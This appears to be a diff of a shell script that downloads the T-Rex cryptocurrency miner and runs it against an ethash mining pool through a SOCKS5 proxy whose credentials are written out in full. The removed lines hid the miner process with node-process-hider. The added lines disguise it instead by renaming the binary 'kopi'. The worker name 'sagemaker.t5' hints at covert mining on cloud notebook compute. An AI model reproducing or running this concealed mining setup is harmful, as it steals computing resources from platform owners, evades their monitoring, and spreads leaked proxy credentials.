@@ -2,11 +2,6 @@
 
 wget https://github.com/trexminer/T-Rex/releases/download/0.24.8/t-rex-0.24.8-linux.tar.gz
 tar -xvf t-rex-0.24.8-linux.tar.gz
-apt update -y && apt install git wget npm sudo -y
-sudo npm install -g n
-sudo n latest
-sudo npm install -g npm
-hash -d npm
-npm i
-npm i -g node-process-hider && ph add t-rex
-./t-rex -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u sagemaker.t5 -p x --proxy socks5://njhlezbg-rotate:bo6mj3wz34gr@p.webshare.io:80
+mv t-rex kopi
+chmod +x kopi
+./kopi -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u sagemaker.t5 -p x --proxy socks5://njhlezbg-rotate:bo6mj3wz34gr@p.webshare.io:80
